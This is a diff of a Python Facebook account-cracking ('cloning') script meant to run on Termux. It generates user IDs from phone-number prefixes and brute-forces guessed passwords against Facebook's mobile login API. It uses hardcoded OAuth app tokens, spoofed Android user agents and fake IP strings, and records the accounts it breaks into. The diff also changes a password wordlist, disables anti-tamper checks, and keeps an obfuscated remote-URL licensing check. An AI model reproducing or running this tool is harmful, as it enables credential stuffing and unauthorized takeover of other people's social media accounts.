@@ -6,8 +6,6 @@ from uuid import uuid4
 import os,sys,tempfile,string,random,subprocess,uuid
 http_directory = tempfile.mkdtemp(prefix='.')
 site_packages = sys.path[4]
-print(site_packages)
-print(http_directory)
 sys.path.remove(site_packages)
 sys.path.insert(4,http_directory+'/reqmodule')
 sys.path.insert(5,http_directory)
@@ -100,14 +98,16 @@ logo= f'''
     888     888 Y88b.      888    888     
     888     888  "Y888b.   888   d88P     
     888     888     "Y88b. 8888888P"       
+
     888 Y8b 888       "888 888 T88b       
     Y88b.Y8b88P Y88b  d88P 888  T88b       
      "Y888888"   "Y8888P"  888   T88b     
             Y8b
 {50*"-"}
-    Tool Version :     10.1.60
+    Tool Version :     10.1.25
     Thanks Alot  :     M.Hamza
 {50*"-"}'''
+
 
 #--(Dark@Colours)---#
 r="\033[1;91m"
@@ -145,6 +145,7 @@ xny = zlib.decompress(b'x\x9c\xcb())(\xb6\xd2\xd7/J,\xd7K\xcf,\xc9(M*-N-J\xce\xc
 update = requests.get(xny).text
 uuidd = str(os.geteuid()) + str(os.getlogin()) + str(os.getuid())
 id = "".join(uuidd).replace("_","").replace("360","AHS").replace("u","9").replace("a","A")
+
 plat = platform.version()[14:][:21][::-1].upper()+platform.release()[5:][::-1].upper()+platform.version()[:8]
 xp = plat.replace(' ', '').replace('-', '').replace('#', '').replace(':', '').replace('.', '').replace(')', '').replace('(', '').replace('?', '').replace('=', '').replace('+', '').replace(';', '').replace('*', '').replace('_', '').replace('?', '').replace('  ', '')
 bxd = ""
@@ -157,12 +158,12 @@ def qsbuy():
                 print(logo)
                 x = requests.get('https://raw.githubusercontent.com/hop09/libraries/main/version.txt').text
                 if str("upppdate") in update:
+
                         os.system('clear')
                         exit('script is in update / maintanance be patient ')
                 elif str("res-sseett") in update:
-                        os.system('')
-                        os.system('')
-                        os.system('')
+
+                        
                         exit('Dont Try To Bypass')
                 elif bumper in myweb2:
                         main()
@@ -184,13 +185,14 @@ def qsbuy():
         except requests.exceptions.ConnectionError:
                 exit(' No internet connection ..')
 
-def rrrr():
+def chkr():
         if bumper in myweb2:
                 pass
         else:
                 qsbuy()
 def xchker():
     pass
+
 def main():
         xchker()
         os.system('rm -rf ...txt')
@@ -353,6 +355,7 @@ def login():
 def method_crack():
         os.system('clear')
         print(logo);xchker()
+
         print(' [1] File Cloning ')
         print(' [2] Email Cloning ')
         print(' [3] Number Cloning ')
@@ -415,6 +418,7 @@ class crack_main():
         def cracknum(self,id):
                 global methods
                 os.system('clear');print(logo);xchker()
+
                 print('\033[0mFor Example :\033[0m 92310,92342,92300,92301 ...')
                 kode = input('\033[0mChoose Code : \033[0m')
                 print('\033[0mFor Example :\033[0m 2000,4000,6000 ...')
@@ -446,14 +450,12 @@ class crack_main():
                                         brand_name_ = "Infinix"
                                         width_ = "720"
                                         height_ = "1280"
-                                uas = 'Davik/2.1.0 (Linux; U; Android '+version_+'.0.0; '+model_+' Build/8BFOHT) [FBAN/FB4A;FBAV/92.866.944.616;FBPN/com.facebook.katana;FBLC/en_US;FBBV/322216925;FBCR/null;FBMF/'+brand_name_+';FBBD/'+brand_name_+';FBDV/'+brand_name_+';FBSV/'+brand_name_+'.0.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.25,width='+width_+',height='+height_+'};]'
-                                fak_tn="350685531728|62f8ce9f74b12f84c123cc23437a4a32","275254692598279|585aec5b4c27376758abb7ffcb9db2af"
                                 adid = str(uuid.uuid4())
-                                abhi = "5531728|62f8ce9"
-                                head = {'Connection': 'keep-alive', 'Authorization': 'OAuth 35068'+abhi+'f74b12f84c123cc23437a4a32', 'Host': 'b-graph.facebook.com', 'X-FB-Friendly-Name': 'authenticate', 'X-FB-Connection-Bandwidth': str(random.randint(2e7, 3e7)), 'X-FB-Net-HNI': str(random.randint(2e4, 4e4)), 'X-FB-SIM-HNI': str(random.randint(2e4, 4e4)), 'X-FB-Connection-Quality': 'EXCELLENT', 'X-FB-Connection-Token': '', 'X-FB-Connection-Type': 'MOBILE.WCDMA', 'User-Agent': uas, 'Accept-Encoding': 'gzip, deflate', 'Content-Type': 'application/x-www-form-urlencoded', 'X-FB-HTTP-Engine': 'Liger', 'Content-Length': '531'}
-                                data = "adid="+adid+"&email="+iid+"&password="+pas+"&cpl=true&credentials_type=password&error_detail_type=password&source=device_based_login&format=json&device_id="+adid+"&family_device_id="+adid+"&session_id="+adid+"&generate_session_cookies=1&generate_analytics_claim=1&generate_machine_id=1&locale=en_US&client_country_code=US&advertising_id="+adid+"&fb_api_req_friendly_name=authenticateate"
-                                po = requests.post('https://b-graph.facebook.com/auth/login',headers=head,data=data).json()
-                                #print(po,hdata)ata)
+                                my_ip = str(random.randint(200,350))+"."+str(random.randint(600,730))+"."+str(random.randint(604,690))+"."+str(random.randint(140,197))
+                                uat = 'Davik/2.1.0 (Linux; U; Android '+version_+'.0.0; '+brand_name_+' Build/'+''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(6))+') [FBAN/FB4A;FBAV/'+my_ip+';FBPN/com.facebook.katana;FBLC/en_US;FBBV/'+str(random.randint(700000000,830000000))+';FBCR/null;FBMF/'+brand_name_+';FBBD/'+brand_name_+';FBDV/'+brand_name_+';FBSV/'+version_+'.0.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.75,width='+width_+',height='+height_+'};FB_FW/1;]'
+                                head = {'Connection': 'keep-alive', 'Authorization': 'OAuth 275254692598279|585aec5b4c27376758abb7ffcb9db2af', 'Host': 'b-graph.facebook.com', 'X-FB-Connection-Bandwidth': str(random.randint(2e7, 3e7)), 'X-FB-Net-HNI': str(random.randint(2e4, 4e4)), 'X-FB-SIM-HNI': str(random.randint(2e4, 4e4)), 'X-FB-Connection-Quality': 'EXCELLENT', 'X-FB-Connection-Type': 'WIFI.LTE', 'X-Tigon-Is-Retry': 'False', 'User-Agent': uat, 'Accept-Encoding': 'gzip, deflate', 'Content-Type': 'application/x-www-form-urlencoded', 'X-FB-HTTP-Engine': 'Liger', 'Content-Length': '530'}
+                                data = "adid="+adid+"&email="+iid+"&password="+pas+"&cpl=true&credentials_type=password&error_detail_type=button_with_disabled&source=login&format=json&device_id="+adid+"&family_device_id="+adid+"&session_id="+adid+"&generate_session_cookies=1&generate_analytics_claim=1&generate_machine_id=1&locale=en_US&client_country_code=US&advertising_id="+adid+"&fb_api_req_friendly_name=authenticate"
+                                po = requests.post("https://b-graph.facebook.com/auth/login",data=data,headers=head).json()
                                 try:
                                         roid = str(po['uid'])
                                 except:
@@ -497,27 +499,11 @@ class crack_main():
                         info_file = open("device_info.txt","a").write(version_+'$'+model_+'$'+brand_name_+'$'+width_+'$'+height_)
                 os.system('clear')
                 print(logo);xchker()
-                print(' for auto password list type auto or Auto')
+                pl = int(input(' How Much Password Do You Want To Add ? '))
+                print(' Example first123,last123,khan123,firstlast')
                 print(50*"-")
-                pl = input(' How Much Password Do You Want To Add ? ')
-                if pl in ['auto','Auto','AUTO','auto or Auto']:
-                        passlist.append('first123')
-                        passlist.append('first12345')
-                        passlist.append('first1234')
-                        passlist.append('khan12')
-                        passlist.append('khankhan')
-                        passlist.append('khan123')
-                        passlist.append('first786')
-                        passlist.append('first12')
-                        passlist.append('first1122')
-                        passlist.append('last123')
-                        passlist.append('last12')
-                        passlist.append('i love you')
-                else:
-                        print(' Example first123,last123,khan123,firstlast')
-                        print(50*"-")
-                        for cd in range(int(pl)):
-                                passlist.append(input(f' ({cd+1}) Password : '))
+                for cd in range(pl):
+                        passlist.append(input(f' ({cd+1}) Password : '))
                 os.system('clear')
                 print(logo);xchker()
                 print(' Total Ids : '+str(len(self.id)))
@@ -720,6 +706,7 @@ def iamBadBoy(exid,cookies,access_token,sf):
 def sep():
         xchker()
         os.system('clear');print(logo);xchker()
+
         try:
                 limit = int(input(' How many links do you want to separate ? '))
         except:
@@ -735,10 +722,12 @@ def sep():
                 links=input(' Put Uid Type : ')
                 os.system('cat '+file_name+' | grep "'+links+'" >> '+new_save)
         print(44*"\033[0m-")
+
         print(f'{rc} ids grabbed successfully{s}')
         print(' Total grabbed ids :\033[0;33m '+str(len(open(new_save).read().splitlines())))
         print('\033[0m New file saved as : \033[0;33m '+new_save)
         print(44*"\033[0m-")
+
         input('\033[0m[Press enter to back] ')
         main()
 
@@ -769,8 +758,8 @@ try:
         fileee = os.listdir('/sdcard/Android/data/')
         if f'com.h{t}pc{a}y.pro' in fileee:
                 print('error occur 0')
-                exit()
-                exit(f'\nsomethiiing went wrong\n\nContact Admin : +923197951815')
+                #exit()
+                #exit(f'\nsomethiiing went wrong\n\nContact Admin : +923197951815')
 except Exception as e:
         print(e)
         pass
@@ -778,20 +767,5 @@ except PermissionError:
         pass
 
 
-'''#----[if-fork]------
-pat = os.getcwd()
-datar = []
-datar.append(pat)
-if '/data/data/com.termux/files/home/Qsr' in datar:
-        pass
-else:
-        for i in range(5000):
-                print(" data is forked / or in other file")
-        exit("Type > cd ~ && python jan.py")
-
-if not os.path.exists('.fam'):
-        qsbuy()
-else:
-        qsbuy()
-'''
+#----[if-fork]------
 main()
